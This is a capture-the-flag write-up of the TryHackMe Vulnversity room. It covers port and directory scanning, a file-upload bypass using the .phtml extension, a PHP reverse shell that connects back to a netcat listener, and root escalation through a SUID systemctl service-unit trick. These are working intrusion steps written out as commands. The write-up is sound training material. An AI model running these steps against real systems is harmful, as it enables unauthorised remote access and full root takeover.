# TryHackMe: Vulnversity — Writeup

## Room Overview

Vulnversity is a beginner-friendly penetration testing room that covers essential
reconnaissance, web application exploitation, and privilege escalation techniques. This room
provides hands-on experience with directory enumeration, file upload vulnerabilities, and
Linux privilege escalation.

| Field | Info |
|-------|------|
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Tools Used | Nmap, GoBuster, BurpSuite, Netcat, PHP Reverse Shell |

---

## Task 1: Deploy the Machine

### Objective
Deploy the vulnerable machine and connect to the TryHackMe network using OpenVPN.

### Steps

1. Click "Start Machine" to deploy the target.
2. Connect to TryHackMe VPN using OpenVPN.
3. Note the target IP address provided.

---

## Task 2: Reconnaissance

### Objective
Perform active reconnaissance to identify open ports, services, and OS information.

### What I Did
I executed a comprehensive Nmap scan to enumerate services:

```bash
nmap -sC -sV -p- <target-ip>
```

**Flags explained:** `-sC` runs default scripts, `-sV` detects versions, `-p-` scans all
65535 ports.

### Scan Results

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.2p2 |
| 139 | NetBIOS | Samba smbd 3.X - 4.X |
| 445 | SMB | Samba smbd 4.3.11 |
| 3128 | HTTP Proxy | Squid http proxy 3.5.12 |
| 3333 | HTTP | Apache httpd 2.4.18 |

---

## Task 3: Locating Directories Using GoBuster

### Objective
Use directory enumeration to discover hidden directories and files on the web server.

### What I Did

```bash
gobuster dir -u http://<target-ip>:3333 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Discovered Directories

```
/images    (Status: 301)
/css       (Status: 301)
/js        (Status: 301)
/internal  (Status: 301)
```

Navigating to `http://<target-ip>:3333/internal` revealed an upload form.

---

## Task 4: Compromise the Webserver

### Objective
Exploit the file upload vulnerability to gain remote code execution.

### Step 1: Test File Upload Restrictions

The upload form at `/internal` accepts files but blocks certain extensions. Testing revealed:

- `.php` — **BLOCKED**
- `.php3` — **BLOCKED**
- `.php4` — **BLOCKED**
- `.php5` — **BLOCKED**
- `.phtml` — **ALLOWED** ✓

### Step 2: Use BurpSuite Intruder

For systematic testing I used BurpSuite Intruder: intercepted the upload request, set the
filename extension as the payload position, loaded a list of PHP extensions, and identified
which returned a "Success" response.

### Step 3: Prepare Reverse Shell

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
mv php-reverse-shell.php shell.phtml
```

Edit the configuration inside the file:

```php
$ip = 'YOUR-THM-VPN-IP';  // tun0 IP
$port = 4444;
```

### Step 4: Set Up Netcat Listener

```bash
nc -lvnp 4444
```

### Step 5: Upload and Execute

1. Upload `shell.phtml` through the `/internal` form.
2. Navigate to `http://<target-ip>:3333/internal/uploads/shell.phtml`.
3. The shell executes and connects back to the listener.

```bash
whoami
# www-data

cd /home && ls
# bill

cat /home/bill/user.txt
```

---

## Task 5: Privilege Escalation

### Objective
Escalate from `www-data` to `root` to capture the root flag.

### Step 1: Enumerate SUID Binaries

```bash
find / -user root -perm /4000 2>/dev/null
```

Among the results, one binary stood out:

```
/bin/systemctl
```

Having SUID on `systemctl` is unusual and exploitable.

### Step 2: Exploit systemctl SUID

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

This creates a temporary service that runs with root privileges due to the SUID bit,
copying the root flag to `/tmp/output`.

### Alternative: Direct Root Shell

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
/bin/bash -p
```

### Step 3: Capture Root Flag

```bash
cat /root/root.txt
```

---

## Tools & Techniques Summary

| Task | Tool | Command |
|------|------|---------|
| Port Scanning | Nmap | `nmap -sC -sV -p- <ip>` |
| Directory Enumeration | GoBuster | `gobuster dir -u <url> -w <wordlist>` |
| Traffic Interception | BurpSuite | Proxy + Intruder |
| Reverse Shell | PHP Reverse Shell | Modified with attacker IP/port |
| Listener | Netcat | `nc -lvnp 4444` |
| SUID Enumeration | find | `find / -user root -perm /4000` |
| Privilege Escalation | systemctl | SUID exploitation via service file |

---

## Conclusion

The Vulnversity room demonstrates a complete penetration testing workflow from reconnaissance
to privilege escalation. Key takeaways:

- **Active Reconnaissance:** Nmap identifies services and potential attack vectors.
- **Web Enumeration:** Directory brute-forcing uncovers hidden functionality.
- **File Upload Bypass:** Testing extension variations circumvents upload restrictions.
- **Remote Code Execution:** File upload vulnerabilities can provide initial access.
- **Linux PrivEsc:** Misconfigured SUID binaries can lead directly to root.

**Room Status:** Completed ✓
